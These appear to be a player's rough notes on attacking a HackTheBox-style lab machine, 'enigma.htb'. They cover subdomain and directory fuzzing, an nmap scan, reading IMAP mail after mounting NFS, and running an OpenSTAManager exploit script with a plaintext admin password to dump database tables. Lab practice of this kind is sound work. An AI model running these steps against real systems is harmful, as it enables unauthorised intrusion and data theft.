1. ./ffuf -w subdomains-top1million-110000.txt -u http://enigma.htb  -H "Host: FUZZ.enigma.htb" -fc 301,302 
mail001

2. nmap -p 80,110,111,143,993,995,2049 -sV 10.129.22.115

3. ./ffuf -w DirBuster-2007_directory-list-2.3-small.txt -u http://enigma.htb/FUZZ
./ffuf -w DirBuster-2007_directory-list-2.3-small.txt -u http://mail001.enigma.htb/FUZZ

4. CVE-2026-48842 https://www.openwall.com/lists/oss-security/2026/06/03/17 but server seems tobe 1.6.16

5. mount nfs and login to imap server
curl -k 'imaps://10.129.24.41/INBOX?ALL' --user aaa:bbb

openssl s_client -connect 10.129.24.41:995 -crlf -quiet

OpenSTAManager Access Request 2.9.8

6. dealing with "_" in url cannot bind host
sudo systemctl disable --now systemd-resolved
dnsmasq

notice this will disable system dns on next restart

7. OpenSTAManager 2.9.8 https://github.com/advisories/GHSA-whv5-4q2f-q68g // seems not workinng
// file upload
python3 exploit-2026-24418.py -t http://support_001.enigma.htb -u admin -p Ne3s4rtars78s --tables -D openstamanager
